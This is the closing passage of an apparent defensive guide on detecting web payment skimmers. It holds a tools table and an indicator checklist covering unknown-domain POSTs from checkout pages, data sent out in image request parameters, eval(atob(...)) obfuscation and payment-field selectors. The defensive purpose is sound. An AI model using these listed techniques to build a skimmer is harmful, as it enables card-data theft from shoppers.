| FIM | OSSEC, Tripwire, AIDE | File change detection |
| Runtime Analysis | Browser DevTools, Custom scripts | Event listener analysis, runtime behavior |
| Deobfuscation | de4js, js-beautify, unminify | Code analysis |
| SIEM | Splunk, ELK Stack | Log aggregation, correlation |

---

### IOC Checklist

**Network IOCs**:
- [ ] Newly registered domains (< 30 days)
- [ ] Bulletproof hosting providers
- [ ] Typosquatting domains
- [ ] POST requests from checkout pages to unknown domains
- [ ] WebSocket connections to non-legitimate endpoints
- [ ] Large URL parameters on image requests

**Host IOCs**:
- [ ] Modified JavaScript files
- [ ] Unexpected event listeners on forms
- [ ] localStorage/sessionStorage with payment terms
- [ ] Browser extensions with excessive permissions

**Code IOCs**:
- [ ] eval(atob(...)) patterns
- [ ] High entropy strings
- [ ] Obfuscated variable names
- [ ] Payment field CSS selectors
- [ ] Debugger detection code
- [ ] Environment fingerprinting

---

**Document End**

*For updates, contributions, or questions, please refer to the main repository.*
